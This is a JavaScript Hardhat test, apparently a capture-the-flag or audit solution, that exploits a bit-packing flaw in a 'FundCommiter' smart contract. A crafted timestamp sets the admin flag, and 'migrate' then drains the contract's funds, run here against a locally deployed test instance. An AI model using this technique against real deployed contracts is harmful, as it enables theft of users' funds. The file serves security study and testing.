const { expect } = require("chai");
const { ethers } = require("hardhat");

// There's a vulnerability in the "_packAndStore" function where we can enable the "admin" flag
// by sending a specific value for the timestamp using the "commit" function. Once we are admins
// we can use the "migrate" to remove the funds.
// Steps:
// 1- Grab any timestamp in the future.
// 2- The bit that controls the admin flag is in position 242. The timestamp itself is shifted 120
//    positions when it's packed. This means we need to place a 1 in position 242-120=122:
//    timestamp + (1 << 122)
// 3- Call "commit" with the payload from the previous step. This will make us admins.
// 4- Call "migrate" with our own address to receive all the funds from the contract.
describe("FundCommiter", function () {
  let fundCommiter;

  beforeEach(async function() {
    const FundCommiter = await ethers.getContractFactory("FundCommiter");
    fundCommiter = await FundCommiter.deploy({ value: ethers.utils.parseEther("0.01") });
  });

  it("can be hacked", async function() {
    const [owner] = await ethers.getSigners();

    const now = parseInt(Date.now() / 1000);
    const future = now + 1000;

    let timelock = ethers.BigNumber.from(future);
    timelock = timelock.add(ethers.BigNumber.from(1).shl(242 - 120));

    await fundCommiter.commit(timelock);

    await fundCommiter.migrate(owner.address);

    expect(await ethers.provider.getBalance(fundCommiter.address)).to.eq(0);
  });
});
